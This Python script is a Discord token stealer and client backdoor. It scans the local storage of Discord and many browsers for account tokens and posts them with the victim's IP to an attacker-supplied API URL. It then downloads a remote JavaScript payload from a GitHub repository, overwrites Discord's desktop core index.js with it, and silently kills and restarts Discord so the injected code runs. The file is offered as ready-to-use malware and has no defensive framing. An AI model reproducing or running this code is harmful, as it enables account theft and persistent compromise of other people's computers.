import os
import re
import requests
import json
import glob
import subprocess

toKill = []
toInject = []
apiURL = "" # Put Your API URL Here
local = os.getenv("LOCALAPPDATA")
roaming = os.getenv("APPDATA")

paths = {
    "Discord": f"{roaming}/Discord/Local Storage/leveldb",
    "Discord Canary": f"{roaming}/DiscordCanary/Local Storage/leveldb",
    "Discord PTB": f"{roaming}/DiscordPTB/Local Storage/leveldb",
    "LigthCord": f"{roaming}/Lightcord/Local Storage/leveldb",
    "Google Chrome": f"{local}/Google/Chrome/User Data/Default/Local Storage/leveldb",
    "Opera": f"{local}/Opera Software/Opera Stable/User Data/Default/Local Storage/leveldb",
    "Opera GX": f"${local}/Opera Software/Opera GX Stable/Local Storage/leveldb",
    "Brave": f"{local}/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb",
    "Yandex": f"{local}/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb",
    "Edge": f"{local}/Microsoft/Edge/User Data/Default/Local Storage/leveldb",
    "uCoz": f"{local}/uCozMedia/Uran/User Data/Default/Local Storage/leveldb",
    "Epic": f"{local}/Epic Privacy Browser/User Data/Local Storage/leveldb",
    "SxS": f"{local}/Google/Chrome SxS/User Data/Local Storage/leveldb",
    "Vivaldi": f"{local}/Vivaldi/User Data/Default/Local Storage/leveldb",
    "Sputnik": f"{local}/Sputnik/Sputnik/User Data/Local Storage/leveldb",
    "7Star": f"{local}/7Star/7Star/User Data/Local Storage/leveldb",
    "CentBrower": f"{local}/CentBrowser/User Data/Local Storage/leveldb",
    "Orbitum": f"{local}/Orbitum/User Data/Local Storage/leveldb",
    "Kometa": f"{local}/Kometa/User Data/Local Storage/leveldb",
    "Torch": f"{local}/Torch/User Data/Local Storage/leveldb",
    "Amigo": f"{local}/Amigo/User Data/Local Storage/leveldb",
}
def grabber(path):
    token = ""
    for name in os.listdir(path):
        if not name.endswith(".ldb"): continue
        for Opened in open(f"{path}\\{name}", errors="ignore").readlines():
            for findToken in (r"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}", r"mfa\.[\d\w_-]{84}",):
                for match in re.findall(findToken, Opened):
                    token = match
    return token
def getIP():
    req = requests.get("http://ip-api.com/json/")
    return req.json()["query"]
for p, path in paths.items():
    if os.path.exists(path):
        token = grabber(path)
        toSend = {
            "token": token,
            "ip": getIP() 
        }
    requests.post(f"{apiURL}/beforeinject", data = json.dumps(toSend).encode())

def backdoored():
    content = requests.get("https://raw.githubusercontent.com/GayarraFrost/DiscordTokenGrabber/main/data/index.js")
    content = content.text
    file = glob.glob(f"{local}/*/app-*/modules/discord_desktop_core-*/discord_desktop_core/index.js")
    for p in file:
        f = open(p, "w")
        f.write(content.replace("*API URL*", apiURL))
        f.close()   


si = subprocess.STARTUPINFO()
si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
def getLaunchedDiscord():
    subprocess.call("fsutil file createnew tasklist.txt 2000", startupinfo=si, stderr=False, stdout=False)
    subprocess.call("tasklist >> tasklist.txt", startupinfo=si, stderr=False, stdout=False)
    tasklist = open("tasklist.txt", "r")
    return tasklist.read()

def killAllDiscord():
    fil = getLaunchedDiscord()
    if fil.find("Discord.exe"): toKill.append("discord")
    if fil.find("DiscordCanary.exe"): toKill.append("discordcanary")
    if fil.find("DiscordDevelopment.exe") : toKill.append("discorddevelopment")
    if fil.find("DiscordPTB.exe"): toKill.append("discordptb")
    for r in toKill: subprocess.call(f"taskkill /IM {r}.exe /F", startupinfo=si, stderr=False, stdout=False)
    os.remove("tasklist.txt")

def runKilledDiscord():
    for r in toKill: subprocess.call(f'{local}/{r}/Update.exe --processStart {r}.exe', startupinfo=si, stderr=False, stdout=False)
killAllDiscord()
backdoored()
runKilledDiscord()
